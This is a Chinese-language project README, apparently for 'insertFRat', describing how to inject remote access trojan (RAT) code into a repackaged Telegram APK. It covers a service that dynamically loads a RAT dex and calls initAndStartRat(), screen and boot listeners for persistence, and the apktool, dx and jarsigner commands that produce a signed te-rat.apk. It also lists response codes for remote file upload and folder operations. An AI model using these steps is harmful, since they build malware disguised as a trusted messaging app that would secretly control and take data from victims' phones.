# Android码（Telegram）
### insertFRat

此项目用于生成部分需要添加的smali代码，如myService中动态加载包含RAT逻辑的jar并执行，注册屏幕监听事件。

#### 生成方式

在Android Studio中编译生成apk文件，接着使用apktool反编译得到的apk。

```shell
apktool d app-debug.apk
```

进入到反编译生成的app-debug文件夹，进入到app-debug/smali/com/hhm/android/otherapp，理论上需要的smali如下：

- myService.smali、myService$1.smali：在服务中动态加载dex并反射执行initAndStartRat()方法启动RAT逻辑的java代码对应的smali。
- ScreenListener.smali、ScreenListener$1.smali、ScreenListener$ScreenBroadcastReceiver.smali、ScreenListener$ScreenStateListener.smali：屏幕事件监听。
- BootReceiver.smali：开机或重启完成监听。

### add
-gradlew makeJar
-dx --dex --output ratdex.jar  rat.jar
-java -jar apktool_2.4.1.jar d app-debug.apk
-java -jar apktool_2.4.1.jar b .\Telegram_v6.3.0_apkpure.com -o te-rat.apk
-jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keypass 123456 -storepass 123456 -keystore demo.keystore te-rat.apk demo.keystore

#### 命令指令问题
-- 0          //success
-- 10001      //没有权限，无法执行操作
-- 10002      //文件上传失败，请重试
-- 10003      //指令参数错误，参数为目录
-- 10004      //文件夹已存在
-- 10005      //文件夹创建失败
